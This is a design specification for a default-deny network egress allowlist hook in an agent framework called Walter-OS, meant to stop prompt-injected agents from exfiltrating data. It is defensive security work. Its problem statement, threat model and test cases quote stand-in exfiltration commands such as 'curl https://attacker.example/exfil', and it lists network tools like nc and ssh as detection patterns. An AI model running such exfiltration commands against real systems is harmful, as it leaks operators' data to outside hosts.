# Network egress allowlist (OSS Trust A-1) — spec

**Status**: ready for `/write-plan` after operator approval
**Parent**: `docs/specs/oss-trust-roadmap.md` Layer A item A-1
**Target release**: v0.5.0
**Depends on**: nothing new in main; uses the env-allowlist parser (P1-09) for the new env vars.

## Problem

Today every shell command an agent invokes can reach any host on the internet. The approval-gate + bash-denylist hooks catch known DESTRUCTIVE patterns (`rm -rf /`, force-pushes, SQL DROP, …) but say nothing about `curl https://random-host.example/exfil`. A prompt-injection that bypasses the existing patterns + finds a novel exfil command has unconstrained network access.

The fix isn't more regex. The fix is a default-deny network gate: agents reach a documented set of operator-approved endpoints; everything else returns "blocked: not in egress allowlist".

## Non-goals

- Cross-application firewall replacement (`ufw` / `nftables`). Out of scope; operator runs whatever host firewall they want.
- Per-tool fine-grained allowlists. Single operator-global allowlist for v0.5.0; per-skill scoping is a v0.6.0 follow-up.
- Inbound traffic filtering. This spec is OUTBOUND only.
- Inspecting TLS payloads. We block at the connection layer; what crosses an allowed connection is the operator's call.

## Decisions (proposed)

| # | Decision | Why |
|---|---|---|
| D-1 | **Allowlist lives at `~/.config/walter-os/egress-allowlist.txt`** (one host per line; lines starting with `#` are comments). | Same convention as `env-allowlist.txt` from P1-09. Operator-editable; no schema. |
| D-2 | **Enforcement via `hooks/network-gate.sh`** — a PreToolUse hook that inspects Bash tool calls for `curl`, `wget`, `git fetch`, `nc`, `ssh`, etc., and refuses if the target host isn't in the allowlist. | Hook-level enforcement keeps the gate inside Walter-OS's existing approval surface; no new daemon to manage. |
| D-3 | **Default-deny.** Allowlist starts empty after install; operator opts in to known-good hosts. | Sane secure floor. The `walter-os egress add <host>` subcommand makes it trivial to populate. |
| D-4 | **Bundled bootstrap allowlist** at `contexts/_examples/egress-allowlist.example.txt` lists the hosts Walter-OS itself talks to (`api.github.com`, `api.anthropic.com`, `pypi.org`, `registry.npmjs.org`, `objects.githubusercontent.com`, `raw.githubusercontent.com`, etc.). Operator copies it on first use. | Avoids first-day frustration; the operator chooses to copy it, so it's still an explicit decision. |
| D-5 | **Subdomain wildcard syntax**: `*.openrouter.ai` matches `api.openrouter.ai` but not `openrouter.ai` (matches Python `fnmatch` semantics). | Operator-friendly + unambiguous. |
| D-6 | **Bypass requires `WALTER_EGRESS_ALLOW_OVERRIDE=1` + `--allow-egress-outbound` flag** — two-factor, same pattern as `bash-denylist`. | Single-factor bypasses get abused. |
| D-7 | **CLI: `walter-os egress {add,remove,list,test}`**. `test <host>` returns whether the host would be allowed without making a request. | Operator can audit + adjust without re-editing the file. |
| D-8 | **Approval-gate integration**: when the gate would otherwise allow a `curl https://X` command, it ALSO consults the egress hook. Gate's allow is necessary-but-not-sufficient; egress hook is the additional check. | Defense in depth. |

## Acceptance criteria

### AC-1 — Allowlist file + parser
- [ ] `~/.config/walter-os/egress-allowlist.txt` schema documented in `docs/operational/network-egress.md`:
  - One host per line (e.g. `api.github.com`)
  - `*.subdomain.example` wildcard
  - `# comments` allowed
  - Blank lines allowed
- [ ] `scripts/walter/lib/egress-loader.sh` exposes `walter_egress_host_allowed <host>` that returns 0 if the host matches an entry, 1 otherwise.
- [ ] `bats` coverage in `tests/walter/egress-loader.bats`:
  - Exact match: `api.github.com` matches the entry `api.github.com`
  - Wildcard: `api.openrouter.ai` matches `*.openrouter.ai`
  - No wildcard for root: `openrouter.ai` does NOT match `*.openrouter.ai`
  - Comment lines ignored
  - Missing file → all hosts denied (fail-closed default)

### AC-2 — `hooks/network-gate.sh` PreToolUse hook
- [ ] Hook reads PreToolUse JSON from stdin.
- [ ] Only inspects `Bash` tool calls (other tools pass through).
- [ ] Parses the command for known network-using commands: `curl`, `wget`, `git fetch/clone/push/pull`, `gh`, `nc`, `ssh`, `scp`, `rsync`, `pip`, `npm`, `uvx`, `cargo`.
- [ ] For each, extracts the target host (URL host, ssh user@host, git remote URL host).
- [ ] If host is NOT in the allowlist → emit `{"decision":"block","reason":"network-gate: <host> not in egress allowlist. Add via: walter-os egress add <host>"}`.
- [ ] If host IS in the allowlist → emit `{"decision":"allow"}`.
- [ ] Bypass: `WALTER_EGRESS_ALLOW_OVERRIDE=1` + `--allow-egress-outbound` in the command → allow with a `systemMessage` WARN.
- [ ] If command has no network operation OR doesn't match any known pattern → `{"decision":"allow"}` (this hook doesn't replace `bash-denylist`, it composes with it).
- [ ] bats coverage in `tests/hooks/network-gate.bats`:
  - `curl https://api.github.com` with `api.github.com` allowlisted → allow
  - `curl https://evil.example` with empty allowlist → block
  - `git clone git@github.com:foo/bar` with `github.com` allowlisted → allow
  - Two-factor bypass works
  - Non-Bash tool → passthrough allow

### AC-3 — CLI: `walter-os egress`
- [ ] `walter-os egress add <host>` appends the host to the allowlist (idempotent).
- [ ] `walter-os egress remove <host>` removes the line.
- [ ] `walter-os egress list` prints the current allowlist.
- [ ] `walter-os egress test <host>` returns `allowed` or `denied` per the loader; exit 0 / 1 mirrors.
- [ ] `walter-os egress import <path>` overwrites the allowlist with the contents of `<path>` (e.g. the bundled `egress-allowlist.example.txt`).
- [ ] bats coverage in `tests/cli/walter-os-egress.bats`.

### AC-4 — Bundled example
- [ ] `contexts/_examples/egress-allowlist.example.txt` ships with these defaults (one per line):
  ```
  # Walter-OS bootstrap allowlist — copy via: walter-os egress import \
  #   ${WALTER_OS_HOME}/contexts/_examples/egress-allowlist.example.txt
  
  # GitHub
  api.github.com
  github.com
  objects.githubusercontent.com
  raw.githubusercontent.com
  codeload.github.com
  
  # Package registries
  registry.npmjs.org
  pypi.org
  files.pythonhosted.org
  
  # LLM APIs (Walter-OS-supported)
  api.anthropic.com
  api.openai.com
  generativelanguage.googleapis.com
  openrouter.ai
  
  # Walter-OS infrastructure
  llm.${WALTER_DOMAIN}
  secrets.${WALTER_DOMAIN}
  
  # System time / OS package mirrors
  pool.ntp.org
  ```

### AC-5 — Installer + audit integration
- [ ] `install.sh` adds a one-time prompt: "Walter-OS ships a default-deny egress allowlist. Import the bundled example? [Y/n]". On Y, runs `walter-os egress import contexts/_examples/egress-allowlist.example.txt`.
- [ ] `daily-supply-chain-audit` adds `check_egress_allowlist()`:
  - If the file doesn't exist → `info` finding (operator hasn't opted in yet — that's fine for the first day)
  - If the file is empty → `info` finding (every network call is blocked; probably misconfigured)
  - If a host in the allowlist resolves to a private IP (10.0.0.0/8, 192.168.0.0/16, etc.) → `high` finding (private-IP rebinding risk; document or remove)

### AC-6 — Approval-gate composition
- [ ] `hooks/approval-gate.sh` documents the relationship in its header comment: "approval-gate handles WHAT (destructive ops); network-gate handles WHERE (allowed hosts). Both must allow before a network operation proceeds."
- [ ] No actual logic change in approval-gate — the network-gate hook runs in parallel via the existing PreToolUse chain.

### AC-7 — Operator docs
- [ ] `docs/operational/network-egress.md` (new):
  - The default-deny philosophy
  - Allowlist file format + wildcard syntax
  - Common operator workflows (adding a new package mirror, allowing a one-off curl)
  - Audit-finding remediation steps
- [ ] CHANGELOG entry under `[Unreleased]` → `Added (default-deny security floor)`.

## Threat model

| Attack | Mitigation |
|---|---|
| Prompt-injection → `curl https://attacker.example/exfil` | `attacker.example` not in allowlist → blocked at PreToolUse |
| Allowlist YAML poisoning by malicious operator dotfile | The file is a flat text list; no parser injection surface. The `egress-loader.sh` does `fnmatch`, never `eval`. |
| Allowlist points at attacker-controlled mirror (e.g. operator pasted a typo'd hostname) | Daily audit checks if entries resolve to private IPs; operator-error mitigation. |
| Bypass via the two-factor escape | Requires `WALTER_EGRESS_ALLOW_OVERRIDE=1` (env, operator-set) AND `--allow-egress-outbound` in the command (operator types it). Both must be present. |
| Time-of-check / time-of-use (host resolution changes between gate and connection) | We pass the LITERAL host string, not a resolved IP. `curl` does its own resolution. We don't try to DNS-resolve in the gate. |

## Out of scope

- **Per-tool allowlists** (`heygen-cli` allowed only `api.heygen.com`). Future work; v0.5.0 stays operator-global.
- **Inspecting TLS payloads**. Connection layer only.
- **MITM / cert-pinning**. Operator's host CA bundle is authoritative.
- **Logging every blocked attempt to a separate egress-deny log**. Audit chain (Layer B of the OSS Trust roadmap) is the natural home; not v0.5.0.

## Recommended PR ordering

1. AC-1 — `egress-allowlist.txt` schema + `egress-loader.sh` lib + bats
2. AC-3 — `walter-os egress` CLI subcommand
3. AC-2 — `hooks/network-gate.sh` PreToolUse hook (uses AC-1 lib)
4. AC-4 — bundled `egress-allowlist.example.txt`
5. AC-5 — installer + audit integration
6. AC-6 — approval-gate doc update (small)
7. AC-7 — operator docs + CHANGELOG (closing PR)

## Open questions for the operator

1. **Default-deny on first install?** Proposal: yes, default-deny, but `install.sh` prompts to import the bundled example (AC-5). Alternative: install with the bundled example already imported. Trade-off: explicit vs frictionless.
2. **Wildcard depth**: `*.example.com` matches `api.example.com` but not `a.b.example.com`. Should it match arbitrary depth? Proposal: yes — `fnmatch` semantics (`*` matches anything including dots). Operator can use `*.example.com,*.api.example.com` for explicit two-level.
3. **`walter-os egress test <host>` should also resolve DNS and report the IP?** Proposal: no — DNS resolution at test-time would teach the agent what the IP is, which has its own leak surface. Test stays string-only.

## Refs

- Parent: `docs/specs/oss-trust-roadmap.md` A-1
- Pattern source: `docs/specs/p1-hardening-epic.md` AC-6 (env-allowlist parser — same shape)
- `hooks/approval-gate.sh` + `hooks/bash-denylist.sh` (existing PreToolUse chain this composes with)
- `scripts/walter/lib/env-loader.sh` (P1-09 parser — template for the egress-loader)
